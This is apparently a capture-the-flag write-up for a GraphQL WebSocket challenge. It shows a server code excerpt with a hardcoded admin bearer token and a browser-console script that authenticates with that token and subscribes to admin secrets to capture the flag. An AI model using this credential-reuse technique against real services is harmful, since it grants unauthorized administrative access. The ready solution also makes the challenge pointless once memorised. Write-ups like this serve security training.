## Insider Trading

Looking at server.js, the WebSocket server uses the graphql-ws library and handles connection initiation inside the onConnect callback: 

```javascript
JavaScript
onConnect: async (ctx) => {
  const authHeader = ctx.connectionParams?.Authorization || '';
  
  if (authHeader === 'Bearer admin-super-secret-token-2026') {
    ctx.extra = { user: { role: 'admin', name: 'SystemAdmin' } };
    return true;
  }
  // ...
```

While standard users are routed through the /api/auth endpoint to receive a limited guest token (Bearer user-guest_player), the administrative token Bearer admin-super-secret-token-2026 is entirely hardcoded in the server source code.

Furthermore, the server relies on the graphql-transport-ws subprotocol, which expects connection parameters (like authentication tokens) to be passed inside the initial JSON payload (connection_init) immediately after establishing the raw WebSocket socket connection.


### Solution 
1. Establish a WebSocket Connection: Connect to the live GraphQL WebSocket endpoint (`ws://<host>:<port>`/graphql) using the mandatory subprotocol graphql-transport-ws.
2. Authenticate as Admin: Send a connection_init message type enclosing the hardcoded bearer token in the payload object.
3. Subscribe to the Flag Feed: Once the server responds with a connection_ack message acknowledging the session upgrade, issue a GraphQL subscription query targeting the adminSecrets query block.
4. Collect the Flag: Wait for the backend administrative bot to broadcast the next tick over the reactive cache stream.



Just use this piece of code in the Developer Tools in the browserr and you will get the flag.


``` javascript
const ws1 = new WebSocket('ws://localhost:4000/graphql', 'graphql-transport-ws');

ws1.onopen = () => {
    // Phase 1: Send the hardcoded token during connection initialization
    ws1.send(JSON.stringify({
        type: 'connection_init',
        payload: { Authorization: 'Bearer admin-super-secret-token-2026' }
    }));
};

ws1.onmessage = (event) => {
    const res = JSON.parse(event.data);

    // Phase 2: Start subscription upon successful authorization ack
    if (res.type === 'connection_ack') {
        ws1.send(JSON.stringify({
            id: 'sub_1',
            type: 'subscribe',
            payload: { query: 'subscription { adminSecrets }' }
        }));
    }
    
    // Phase 3: Catch the dynamic flag stream transmission
    if (res.type === 'next') {
        console.log('[!] Flag recovered:', res.payload.data);
    }
};
```